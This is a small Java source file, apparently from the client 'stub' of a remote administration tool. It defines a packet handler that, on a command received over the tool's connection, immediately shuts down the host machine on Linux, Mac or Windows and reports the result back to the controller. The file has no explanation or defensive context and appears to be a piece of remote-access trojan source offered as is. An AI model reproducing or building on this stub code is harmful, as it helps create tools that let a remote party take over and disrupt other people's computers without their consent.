package com.redpois0n.stub.packets.incoming;

import com.redpois0n.Connection;
import com.redpois0n.Constants;

public class PacketSHUTDOWN extends AbstractIncomingPacket{

	@Override
	public void read() throws Exception {
		String operatingSystem = System.getProperty("os.name");
		if (operatingSystem.toLowerCase().contains("linux") || operatingSystem.toLowerCase().contains("mac")) {
			Runtime.getRuntime().exec("shutdown -h now");
			Connection.status(Constants.STATUS_STARTING_SHUTDOWN);
		} else if (operatingSystem.toLowerCase().contains("windows")) {
			Runtime.getRuntime().exec("shutdown.exe -s -t 0");
			Connection.status(Constants.STATUS_STARTING_SHUTDOWN);
		} else {
			Connection.status(Constants.STATUS_FAILED_SHUTDOWN);
		}
	}

}
